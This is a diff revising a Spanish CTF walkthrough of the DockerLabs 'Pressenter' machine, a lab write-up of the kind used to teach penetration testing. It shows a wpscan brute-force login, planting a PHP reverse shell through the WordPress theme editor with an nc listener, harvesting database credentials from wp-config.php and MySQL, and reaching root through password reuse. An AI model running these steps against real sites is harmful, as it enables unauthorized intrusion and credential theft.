@@ -2,21 +2,26 @@ Propiedades:
 - OS: Linux
 - Plataforma: DockerLabs
 - Nivel: Easy
-- Tags: #wordpress #dockerlabs
+- Tags: #wordpress #wpscan #brute-force #mysql #password-reuse #theme-editor
 
 ![](assets/Pasted%20image%2020251107001007.png)
 
 ## Reconocimiento
 
-Comenzamos tirando un ping para comprobar conexion
+Comienzo tirando un ping para comprobar la conectividad.
+
 ```bash
 > ping -c 1 172.17.0.2
+PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
+64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.250 ms
+
 --- 172.17.0.2 ping statistics ---
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
 rtt min/avg/max/mdev = 0.250/0.250/0.250/0.000 ms
 ```
 
-Realizamos un escaneo con nmap para descubrir puertos abiertos
+Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.
+
 ```bash
 > nmap -p- -sS -Pn -n --min-rate 5000 172.17.0.2 -oN ports.txt
 --------------------------------------------------------------
@@ -24,9 +29,10 @@ PORT   STATE SERVICE
 80/tcp open  http
 ```
 
-- Al parecer solo tenemos abierto el puerto 80
+- Solo tenemos el puerto 80 abierto.
 
-Realizamos un segundo escaneo mas profundo sobre el puerto abierto 80
+Sobre el puerto abierto realizo un segundo escaneo más profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.
+
 ```bash
 > sudo nmap -p 80 -sCV -Pn -n --min-rate 5000 -sS 172.17.0.2 -oN target.txt
 -----------------------------------------------------------------------------------
@@ -37,67 +43,69 @@ PORT   STATE SERVICE VERSION
 MAC Address: 02:29:1E:07:C2:61 (Unknown)
 ```
 
-- Corre el servicio Apache httpd 2.4.58 ((Ubuntu))
+- Puerto 80 HTTP Apache httpd 2.4.58 (Ubuntu)
 
 ## Enumeración
 
-**Puerto 80**
+### Puerto 80 HTTP
 
-- Pagina principal
+La página principal muestra una landing page simple del CTF.
 
 ![](assets/Pasted%20image%2020251107001538.png)
 
-- Pagina de Login
+También existe una página de login accesible.
 
 ![](assets/Pasted%20image%2020251107001818.png)
 
-**Codigo Fuente**
+**Código Fuente.**
 
-Viendo el codigo fuente encontramos un dominio:
+Inspeccionando el código fuente de la página principal encuentro un dominio oculto en el footer.
+
 ```html
-    <footer>
-        <p>&copy; 2024 Pressenter CTF. All rights reserved.</p>
-        <p class="hidden-domain">Find us at <a href="http://pressenter.hl" target="_blank">pressenter.hl</a></p>
-    </footer>
+<footer>
+    <p>&copy; 2024 Pressenter CTF. All rights reserved.</p>
+    <p class="hidden-domain">Find us at <a href="http://pressenter.hl" target="_blank">pressenter.hl</a></p>
+</footer>
 ```
 
-El dominio no lleva a nada por lo cual decidí meterlo al /etc/hosts
-```
+Agrego el dominio al archivo `/etc/hosts`.
+
+```bash
+> cat /etc/hosts
 172.17.0.2 pressenter.hl
 ```
 
-**Identificacion de Tecnologias Web**
+### Dominio pressenter.hl
 
-Accedo al nuevo dominio: ***pressenter.hl*** y Wappalyzer detecta que esta nueva pagina es un WordPress.
+**Identificación de Tecnologías Web.**
+
+Accedo al dominio `pressenter.hl` y Wappalyzer detecta que se trata de un sitio WordPress.
 
 ![](assets/Pasted%20image%2020251107003510.png)
 
-La ruta de `wp-admin` esta expuesta:
-
-- Si llegamos a obtener credenciales validas vamos a poder acceder al panel de administracion de Wordpress.
+Confirmo que el panel de administración de WordPress está expuesto en la ruta `/wp-admin`.
 
 ![](assets/Pasted%20image%2020251107003605.png)
 
+**Enumeración de WordPress con WPScan.**
 
-Por lo cual ahora decido utilizar `wpscan` para enumerar posibles usuarios u plugins vulnerables
+Utilizo `wpscan` para enumerar usuarios y posibles vulnerabilidades en la instalación de WordPress.
+
 ```bash
-[!] 2 vulnerabilities identified:
- | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
- |     Fixed in: 6.6.4
- |     References:
- |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
- |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
- |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
- |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
- |
- | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
- |     Fixed in: 6.6.4
- |     References:
- |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
- |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
- |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
- |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+> sudo wpscan --url http://pressenter.hl --enumerate u,vp
+```
+
+El escaneo revela:
+
+- **2 vulnerabilidades identificadas:** (Aunque no son nada relevante para la explotacion.)
+  - CVE-2025-58674: XSS almacenado en DOM (Author+)
+  - CVE-2025-58246: Divulgación de datos sensibles (Contributor+)
+
+- **Usuarios identificados:**
+  - `pressi`
+  - `hacker`
+
+```bash
 [i] User(s) Identified:
 
 [+] pressi
@@ -110,12 +118,9 @@ Por lo cual ahora decido utilizar `wpscan` para enumerar posibles usuarios u plu
  | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 ```
 
-- Encontramos 2 usuarios uno llamado pressi y otro hacker.
-- 2 Vulnerabilidades encontradas.
-
 ## Explotación
 
-Opte por realizar un ataque de fuerza bruta sobre el usuario pressi utilizando la herramienta de `wpscan`.
+Con los usuarios identificados, realizo un ataque de **fuerza bruta** contra el panel de login de WordPress utilizando `wpscan` y el diccionario `rockyou.txt`.
 
 ```bash
 > sudo wpscan --url http://pressenter.hl -U pressi -P /usr/share/wordlists/rockyou.txt
@@ -123,47 +128,50 @@ Opte por realizar un ataque de fuerza bruta sobre el usuario pressi utilizando l
 [!] Valid Combinations Found:
  | Username: pressi, Password: dumbass
 ```
-- Credenciales encontradas pressi:dumbass
 
-Con estas credenciales accedo al wordpress mediante el login.
+- Encuentro credenciales válidas: `pressi:dumbass`
 
-Dentro del wordpress me dirigí a la parte de herramientas y edite el `index.php` del tema `Twenty Twenty Two` para subir una reverse shell
+Accedo al panel de administración de WordPress con estas credenciales.
+
+**Subida de Reverse Shell mediante Theme Editor**
+
+Una vez dentro del panel de WordPress, me dirijo a **Herramientas → Editor de archivos de temas** y selecciono el tema `Twenty Twenty Two`. Edito el archivo `index.php` del tema para incluir una reverse shell en PHP. Yo utilice la Reverse-shell de [PentestMonkeyRevSh](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 
 ![](assets/Pasted%20image%2020251107010844.png)
 
+Me pongo en escucha en mi máquina atacante.
 
-Me puse en escucha por el puerto 443.
 ```bash
 > sudo nc -nlvp 443
+listening on [any] 443 ...
 ```
 
- Y me dirigí a la ruta donde se guardan los temas para ejecutar la reverse shell.
- ```
- http://pressenter.hl/wp-content/themes/twentytwentytwo/
- ```
+Accedo a la ruta donde se almacenan los temas para ejecutar la reverse shell.
 
-Tenemos acceso al sistema:
+```
+http://pressenter.hl/wp-content/themes/twentytwentytwo/
+```
+
+Recibo la conexión y obtengo acceso al sistema como `www-data`.
+
 ```bash
+connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 45678
 www-data@23bf441840e6:/$ whoami
-whoami
 www-data
+www-data@23bf441840e6:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 ## Escalada de Privilegios
 
-Dentro del sistema intente hacer un _sudo -l_ pero al parecer no tenemos permisos. Por lo cual decidí apuntar al directorio _/tmp_ donde había un archivo que no podía leer a menos que fuera el usuario _mysql_
-![](assets/Pasted%20image%2020251107011203.png)
+### Enumeración de Credenciales en wp-config.php
 
-Por lo cual decidí ver el contenido del `wp-config.php`. Este archivo es el archivo de configuracion de wordpress, contiene informacion sensible como credenciales de base de datos, entre otras.
-
+El archivo `wp-config.php` de WordPress contiene información sensible como credenciales de base de datos. Busco y leo este archivo.
 
 ```bash
 > find / -name "wp-config.php" 2>/dev/null
-------------------------------------------
 /var/www/pressenter/wp-config.php
-```
 
-```bash
 > cat /var/www/pressenter/wp-config.php
 ----------------------------------------
 /** Database username */
@@ -173,16 +181,20 @@ define( 'DB_USER', 'admin' );
 define( 'DB_PASSWORD', 'rooteable' );
 ```
 
-- Descubrí las credenciales del usuario admin para la base de datos MySQL
+- Encuentro credenciales de MySQL: `admin:rooteable`
 
-Decidí conectarme:
+### Enumeración de la Base de Datos MySQL
+
+Me conecto a la base de datos MySQL con las credenciales encontradas.
+
 ```bash
 > mysql -u admin -p'rooteable' -h 127.0.0.1
 ```
 
-Decidí empezar a listar informacion de la DB
+Listo las bases de datos disponibles.
+
 ```mysql
-show databases;
+mysql> show databases;
 +--------------------+
 | Database           |
 +--------------------+
@@ -192,9 +204,11 @@ show databases;
 +--------------------+
 ```
 
-- Decido listar las tablas de la base de datos _wordpress_
+Selecciono la base de datos `wordpress` y listo sus tablas.
+
 ```mysql
-> show tables;
+mysql> use wordpress;
+mysql> show tables;
 +-----------------------+
 | Tables_in_wordpress   |
 +-----------------------+
@@ -214,9 +228,10 @@ show databases;
 +-----------------------+
 ```
 
-Aquí fue donde encontré la tabla `wp_username` la cual decidí inspeccionar y al parecer descubrí un posible usuario
+Encuentro una tabla no estándar llamada `wp_usernames`. La inspecciono.
+
 ```mysql
-select * from wp_usernames;
+mysql> select * from wp_usernames;
 +----+----------+-----------------+---------------------+
 | id | username | password        | created_at          |
 +----+----------+-----------------+---------------------+
@@ -224,15 +239,23 @@ select * from wp_usernames;
 +----+----------+-----------------+---------------------+
 ```
 
-Migramos al usuario enter
+- Encuentro credenciales: `enter:kernellinuxhack`
+
+### Migración al usuario enter
+
+Utilizo las credenciales para migrar al usuario `enter`.
+
 ```bash
-> su enter
+www-data@23bf441840e6:/$ su enter
+Password: kernellinuxhack
+enter@23bf441840e6:/$ whoami
+enter
 ```
 
-Lo primero que hice fue listar binarios con privilegios de SUDO.
+Ahora enumero binarios que pueda ejecutar como el usuario `root`
+
 ```bash
-> enter@23bf441840e6:/tmp$ sudo -l
-sudo -l
+enter@23bf441840e6:/$ sudo -l
 Matching Defaults entries for enter on 23bf441840e6:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
@@ -242,20 +265,21 @@ User enter may run the following commands on 23bf441840e6:
     (ALL : ALL) NOPASSWD: /usr/bin/cat
     (ALL : ALL) NOPASSWD: /usr/bin/whoami
 ```
-- Encontre el binario cat y whoami
 
+- Puedo ejecutar `cat` y `whoami` como cualquier usuario sin contraseña.
 
-Lo primero que intente fue hacerle un `cat` al archivo temporal tmp.ZTRADbTigY. Pero no tuve éxito
+Aunque tengo acceso a `cat` como root, lo cual podría permitirme leer archivos sensibles, decido probar la **reutilización de contraseñas** para el usuario root.
 
-Por lo cual simplemente probé usar la misma password para el usuario root y lamentablemente funciono.
 ```bash
-> enter@23bf441840e6:/tmp$ su root           
-su root
+enter@23bf441840e6:/$ su root
 Password: kernellinuxhack
 
-> root@23bf441840e6:/tmp# whoami
-whoami
+root@23bf441840e6:/# whoami
 root
+root@23bf441840e6:/# id
+uid=0(root) gid=0(root) groups=0(root)
 ```
+
+- La contraseña `kernellinuxhack` también funciona para el usuario root.
 
 ***PWNED***
